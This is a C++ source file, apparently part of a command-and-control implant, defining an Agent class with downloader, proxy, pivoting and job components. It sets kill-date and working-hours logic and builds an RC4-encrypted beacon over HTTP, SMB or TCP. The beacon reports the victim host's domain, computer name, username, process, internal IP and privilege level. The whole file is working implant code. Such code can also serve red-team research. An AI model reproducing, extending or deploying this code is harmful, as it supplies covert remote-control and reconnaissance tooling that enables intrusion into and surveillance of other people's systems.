#include "Agent.h"
#include "ApiLoader.h"
#include "utils.h"
#include "Packer.h"
#include "Crypt.h"

Agent::Agent()
{
	info  = (AgentInfo*) MemAllocLocal(sizeof(AgentInfo));
	*info = AgentInfo();
	
	config  = (AgentConfig*) MemAllocLocal(sizeof(AgentConfig));
	*config = AgentConfig();

	commander  = (Commander*) MemAllocLocal(sizeof(AgentConfig));
	*commander = Commander(this);

	downloader  = (Downloader*) MemAllocLocal(sizeof(Downloader));
	*downloader = Downloader( config->download_chunk_size );

	jober  = (JobsController*)MemAllocLocal(sizeof(JobsController));
	*jober = JobsController();

	memorysaver  = (MemorySaver*)MemAllocLocal(sizeof(MemorySaver));
	*memorysaver = MemorySaver();

	proxyfire  = (Proxyfire*)MemAllocLocal(sizeof(Proxyfire));
	*proxyfire = Proxyfire();

	pivotter  = (Pivotter*)MemAllocLocal(sizeof(Pivotter));
	*pivotter = Pivotter();

	SessionKey = (PBYTE) MemAllocLocal(16);
	for (int i = 0; i < 16; i++)
		SessionKey[i] = GenerateRandom32() % 0x100;

	this->config->active = true;
}

void Agent::SetActive(BOOL state)
{
	this->config->active = state;
}

BOOL Agent::IsActive()
{
	ULONG now = GetSystemTimeAsUnixTimestamp();
	return this->config->active && !(this->config->kill_date && now >= this->config->kill_date);
}

ULONG Agent::GetWorkingSleep() 
{
    if ( !this->config->working_time )
        return 0;

    WORD endM   = (this->config->working_time >> 0) % 64;
    WORD endH   = (this->config->working_time >> 8) % 64;
    WORD startM = (this->config->working_time >> 16) % 64;
    WORD startH = (this->config->working_time >> 24) % 64;

	ULONG newSleepTime = 0;
	SYSTEMTIME SystemTime = { 0 };
    ApiWin->GetLocalTime(&SystemTime);

    if (SystemTime.wHour < startH) {
        newSleepTime = (startH - SystemTime.wHour) * 60 + (startM - SystemTime.wMinute);
    }
    else if (endH < SystemTime.wHour) {
        newSleepTime = (24 - SystemTime.wHour - 1) * 60 + (60 - SystemTime.wMinute);
        newSleepTime += startH * 60 + startM;
    }
    else if (SystemTime.wHour == startH && SystemTime.wMinute < startM) {
        newSleepTime = startM - SystemTime.wMinute;
    }
    else if (SystemTime.wHour == endH && endM <= SystemTime.wMinute) {
        newSleepTime = 23 * 60 + (60 + startM - SystemTime.wMinute);
    }
    else {
        return 0;
    }

    return newSleepTime * 60 - SystemTime.wSecond;
}

BYTE* Agent::BuildBeat(ULONG* size)
{
	BYTE flag = 0;
	flag += this->info->is_server; 
	flag <<= 1;
	flag += this->info->elevated;
	flag <<= 1;
	flag += this->info->sys64;
	flag <<= 1;
	flag += this->info->arch64;

	Packer* packer = (Packer*) MemAllocLocal(sizeof(Packer));
	*packer = Packer();

	packer->Pack32(this->config->agent_type);
	packer->Pack32(this->info->agent_id);
	packer->Pack32(this->config->sleep_delay);
	packer->Pack32(this->config->jitter_delay);
	packer->Pack32(this->config->kill_date);
	packer->Pack32(this->config->working_time);
	packer->Pack16(this->info->acp);
	packer->Pack16(this->info->oemcp);
	packer->Pack8(this->info->gmt_offest);
	packer->Pack16(this->info->pid);
	packer->Pack16(this->info->tid);
	packer->Pack32(this->info->build_number);
	packer->Pack8(this->info->major_version);
	packer->Pack8(this->info->minor_version);
	packer->Pack32(this->info->internal_ip);
	packer->Pack8( flag );
	packer->PackBytes(this->SessionKey, 16);
	packer->PackStringA(this->info->domain_name);
	packer->PackStringA(this->info->computer_name);
	packer->PackStringA(this->info->username);
	packer->PackStringA(this->info->process_name);

	EncryptRC4(packer->data(), packer->datasize(), this->config->encrypt_key, static_cast<int>(this->config->encrypt_key_size));

	MemFreeLocal((LPVOID*)&this->info->domain_name,   StrLenA(this->info->domain_name));
	MemFreeLocal((LPVOID*)&this->info->computer_name, StrLenA(this->info->computer_name));
	MemFreeLocal((LPVOID*)&this->info->username,      StrLenA(this->info->username));
	MemFreeLocal((LPVOID*)&this->info->process_name,  StrLenA(this->info->process_name));

#if defined(BEACON_HTTP) 

	ULONG beat_size = packer->datasize();
	PBYTE beat      = packer->data();

#elif defined(BEACON_SMB) 

	ULONG beat_size = packer->datasize() + 4;
	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);

	memcpy(beat, &(this->config->listener_type), 4);
	memcpy(beat+4, packer->data(), packer->datasize());

	PBYTE pdata = packer->data();
	MemFreeLocal((LPVOID*)&pdata, packer->datasize());

#elif defined(BEACON_TCP) 

	ULONG beat_size = packer->datasize() + 4;
	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);

	memcpy(beat, &(this->config->listener_type), 4);
	memcpy(beat + 4, packer->data(), packer->datasize());

	PBYTE pdata = packer->data();
	MemFreeLocal((LPVOID*)&pdata, packer->datasize());

#endif

	MemFreeLocal((LPVOID*)&packer, sizeof(Packer));

	*size = beat_size;
	return beat;
}
